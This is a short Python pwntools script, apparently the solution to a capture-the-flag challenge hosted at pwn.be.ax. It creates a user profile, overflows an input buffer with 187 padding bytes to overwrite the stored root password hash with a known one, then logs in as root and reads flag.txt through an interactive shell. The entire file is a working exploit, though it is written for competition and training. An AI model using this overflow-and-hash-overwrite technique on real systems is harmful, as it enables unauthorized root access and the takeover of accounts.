from pwn import *

p = remote('pwn.be.ax', 5001)
username = b'abc\n'
passwd = b'123\n'
hashOfPasswd = b'13YPY/c.qiCtw\n'
sizeOfjunk = b'120\n'					#junk for userbuffer


#create profile
p.sendafter('> ', username)
p.sendafter('> ', passwd)
p.sendafter('> ', sizeOfjunk)
payload = b'a' * 187 + hashOfPasswd
p.sendafter('> ', payload)

#logout
p.sendline(b'1')
p.sendline(b'root')
p.sendline(b'123')

p.sendline(b'3')
p.sendline(b'cat flag.txt')
p.interactive()